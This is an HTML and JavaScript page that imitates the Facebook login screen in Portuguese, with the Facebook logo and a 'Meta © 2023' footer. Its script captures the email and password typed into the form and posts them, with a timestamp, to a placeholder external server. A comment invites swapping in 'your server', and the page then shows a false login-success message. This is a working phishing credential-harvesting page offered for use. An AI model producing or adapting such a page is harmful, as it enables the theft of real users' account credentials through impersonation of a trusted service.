<body>
    <div class="logo">facebook</div>
    
    <div class="card">
        <h2>Entrar no Facebook</h2>
        
        <div id="message" class="message"></div>
        
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="email" placeholder="Email ou telefone" required="">
            </div>
            
            <div class="form-group">
                <input type="password" id="password" placeholder="Senha" required="">
            </div>
            
            <button type="submit" class="btn-login">Entrar</button>
        </form>
        
        <div class="forgot-password">
            <a href="#">Esqueceu a senha?</a>
        </div>
        
        <div class="separator"><span>ou</span></div>
        
        <button class="btn-create">Criar nova conta</button>
    </div>

        <p>Meta © 2023</p>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            // Validação básica
            if (!email || !password) {
                showMessage('Por favor, preencha todos os campos.', 'error');
                return;
            }
            
            // Dados para enviar ao servidor
            const formData = {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            };
            
            // Aqui você pode modificar a URL para apontar para seu servidor
            fetch('https://seu-servidor.com/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            })
            .then(response => {
                if (response.ok) {
                    return response.json();
                }
                throw new Error('Erro na requisição');
            })
            .then(data => {
                showMessage('Login realizado com sucesso! Verificando credenciais...', 'success');
                // Aqui você pode redirecionar o usuário ou realizar outras ações
            })
            .catch(error => {
                // Em caso de erro ou para teste, os dados serão exibidos no console
                console.log('Dados do formulário:', formData);
                showMessage('Dados enviados para análise. Verifique o console.', 'success');
            });
        });
        
        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
            
            // Esconder a mensagem após 5 segundos
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 5000);
        }
    </script>
